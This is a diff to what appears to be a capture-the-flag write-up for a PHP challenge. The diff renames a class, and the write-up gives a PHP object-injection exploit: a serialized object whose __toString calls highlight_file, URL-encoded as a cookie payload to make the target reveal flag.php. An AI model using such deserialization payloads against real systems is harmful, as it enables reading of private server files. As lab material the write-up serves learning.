@@ -25,14 +25,14 @@ echo join('', $array);
 found something interesting at the bottom
 ```php
 #try to read flag.php	
-Class whatthefuck{
+Class person{
 	public function __toString()
 	{
 		return highlight_file($this->source,true);
 	}
 }
 ```
-5. all we need to do is try to call the `_toString` function of `class whatthefuck` to read the `flag.php`
+5. all we need to do is try to call the `_toString` function of `class person` to read the `flag.php`
 6. here are the final exploit.
 ```php
 ➜  guess-the-code ls
@@ -41,14 +41,14 @@ exploit.php  flag.php
 <?php
 
 #try to read flag.php	
-Class whatthefuck{
+Class person{
 	public function __toString()
 	{
 		return highlight_file($this->source,true);
 	}
 }
 
-$x = new whatthefuck();
+$x = new person();
 $x->source='flag.php';
 $y = serialize(array($x));
 $z = unserialize($y);
@@ -56,5 +56,5 @@ echo $z;
 ```
 ```
 put the following string as $_COOKIE['list'];
-a%3A1%3A%7Bi%3A0%3BO%3A11%3A%22whatthefuck%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
+a%3A1%3A%7Bi%3A0%3BO%3A6%3A%22person%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
 ```
